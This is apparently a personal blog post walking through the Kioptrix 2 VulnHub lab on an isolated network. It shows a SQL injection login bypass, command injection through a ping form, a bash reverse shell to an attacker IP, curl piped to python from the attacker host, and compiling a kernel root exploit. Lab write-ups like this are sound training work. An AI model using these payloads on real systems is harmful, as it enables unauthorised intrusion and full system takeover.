---
published: true
layout: post
tags:
  - Pentesting
  - Vulnhub
title: VulnHub - Kioptrix 2
---
<p><img alt="" src="https://i.imgur.com/MOwgmQ0.png" style="height:400px; width:400px" /></p>

<hr />
<p>Time for Kioptrix #2! This one was ever so slightly more difficult to get root on, but only because I let myself fall down rabbit holes instead of exploiting the obvious.</p>

<hr />
<h2>Recon and initial enumeration:</h2>

<p>As always I started off using my favorite scanning tool Sparta to get the open ports, as well as run some initial enumeration:</p>

<p><img alt="" src="https://i.imgur.com/nAzPf7Y.png" style="height:214px; width:626px" /></p>

<p>A few interesting things here, once again we have web ports open, a probable entry point. I couldn&#39;t help but take notice of port 666 though....after seeing that I decided to listen to some music from DOOM while doing my next few steps</p>

<p><img alt="" src="https://steamuserimages-a.akamaihd.net/ugc/950715826708058897/2B0EE5E6542132D5F7D96D89936F2BF8940C86A3/" style="height:270px; width:480px" /></p>

<p>The next thing I checked were the Nikto results, courtesy of Sparta,</p>

<p><img alt="" src="https://i.imgur.com/0ngMxvn.png" style="height:406px; width:1165px" /></p>

<p>I don&#39;t see anything particularly interesting though. Some of these results may have been worth researching, but first I wanted to check out the webpage itself.</p>

<hr />
<h2>Initial foothold:</h2>

<p>After browsing to the IP address of the box on my local, isolated VMware network, I found a very simple login prompt:</p>

<p><img alt="" src="https://i.imgur.com/xdypN73.png" style="height:191px; width:315px" /></p>

<p>I checked the page source, something I do all the time, just in case there are hints hidden in the code (intentional or unintentional)</p>

<p><img alt="" src="https://i.imgur.com/IUxlvVi.png" /></p>

<p>Doesn&#39;t look like there is anything special here, moving on.</p>

<p>Recalling that this box is running MySQL, I immediately started poking at the login boxes with SQL injection. It only took about three tries, and I had success typing this into the password field:</p>

<ul>
	<li>1&#39; or &#39;1&#39;=&#39;1</li>
</ul>

<p>Usually my first tries are something along the lines of:</p>

<ul>
	<li>any&#39; or 1=1;#</li>
</ul>

<p>This only sometimes works, but it all depends on how the SQL statement is crafted on the backend. Since the first example was the one that let me in, I can only guess that the SQL statement looked something like:</p>

<ul>
	<li>SELECT * FROM users WHERE username=&#39; &#39; AND password=&#39; &#39;</li>
</ul>

<p>So after my injection, it probably looked like this:</p>

<ul>
	<li>SELECT * FROM users WHERE username=&#39;admin&#39; AND password=&#39;1&#39; or &#39;1&#39;=1&#39;</li>
</ul>

<p>Since adding the "or 1=1" will cause the statement to always evaluate to "true", it bypasses the password check.</p>

<p>Aftering logging in I find something that quickly gave me ideas about remote code injection:</p>

<p><img alt="" src="https://i.imgur.com/8vsDOjy.png" /></p>

<p>This plainly states that we&#39;re executing a command on the backend, and it&#39;s asking us for an IP address as a parameter. So, to test it out, I ping my attacking machine.</p>

<p><img alt="" src="https://i.imgur.com/oao32Oz.png" /></p>

<p>Looks just like the output from a linux bash prompt, so we&#39;re definitely running a command and getting back the exact output from the command. There is a way to chain commands in linux, such as:</p>

<ul>
	<li>&&</li>
	<li>||</li>
	<li>;</li>
</ul>

<p>Since the first two usually depend on the success or failure of the first command, I just go with ; because it&#39;s simply tacking on a second command to the first. So I test that out:</p>

<p><img alt="" src="https://i.imgur.com/sah3ZQQ.png" /></p>

<p>At the bottom of the ping printout, we can see that the command "pwd" or "print working directory" executed and told us that we&#39;re in "/var/www/html". At this point it is confirmed that it&#39;s possible to inject linux commands into this server.</p>

<p>Immediately I attempt a reverse shell command:</p>

<ul>
	<li>bash -i >$ /dev/tcp/10.0.0.128/443 0>&1</li>
</ul>

<p>This resulted in a successful connection back to my listening netcat session:</p>

<p><img alt="" src="https://i.imgur.com/POJePjU.png" style="height:143px; width:534px" /></p>

<hr />
<h2>Privilege Escalation:</h2>

<p>So as I anticipated, I landed on the account running the webpage, in this case, "apache". This account has pretyy low privileges and can&#39;t look at very much or do much, and without a password, using sudo isn&#39;t possible.</p>

<p>Manual enumeration is good to practice, but for this box I wanted to use a new script that I haven&#39;t used before. It&#39;s a python script that does a lot of basic priv esc checks and presents it in a nice, readable format.</p>

<p><a href="https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py">https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py</a></p>

<p>I downloaded it to the attacking machine, and then hosted an http server on my Kali box with</p>

<ul>
	<li>python -m SimpleHTTPServer 80</li>
</ul>

<p>This starts up an HTTP server on port 80 (this module defaults to 8080 if you don&#39;t provide a port number), and will serve the files that are <strong>in the directory that you launched the server from. </strong>I had the victim download it from my attacking machine by changing to the /tmp directory (all accounts have write access in this directory) and running this:</p>

<ul>
	<li>curl 10.0.0.128/linuxprivcheck.py | python</li>
</ul>

<p>I had to pipe it to python because this command just printed the script&#39;s source code to the terminal and didn&#39;t execute.</p>

<p>This script output a LOT of text, and for some reason, I couldn&#39;t get it to properly pipe to "less" or "more", so I could only read the last bit, but luckily, that was enough.</p>

<p><img alt="" src="https://i.imgur.com/IDCuClm.png" /></p>

<p>This shows us some potential exploits that could be used on the system for priv esc. I usually shy away from kernel exploits, because they can take the box down if they aren&#39;t written well, but this box is running CentOS 4.5, which is quite old, so I&#39;m a bit more willing to rely on well-known and well-tested exploits.</p>

<p>The one I ended up using was <a href="https://www.exploit-db.com/exploits/9479">ring0 Root Exploit.</a></p>

<p>Again I started up the python HTTP server, and downloaded it to the victim:</p>

<ul>
	<li>wget 10.0.0.128/9479.c</li>
</ul>

<p>The target has gcc installed, so I compiled it on the victim.</p>

<ul>
	<li>gcc 9472.c -o pwn</li>
</ul>

<p>The resulting executable already has execution permissions on it, so I don&#39;t have to use "chmod". It was simply invoked with "./pwn", and BAM!, we are root.</p>

<p><img alt="" src="https://i.imgur.com/23P9KCg.png" style="height:44px; width:143px" /></p>

<hr />
<h2>Summary:</h2>

<p>Another fairly easy box if you don&#39;t fall into rabbit-holes and over-think the priv esc. It only requires very basic knowledge of SQLi and command injection, and has an easy priv-esc in the form of a kernel exploit that reliably gets a root shell. I couldn&#39;t find any flags on this box, but root is root I guess.</p>

<p>Kioptrix 3 soon!</p>
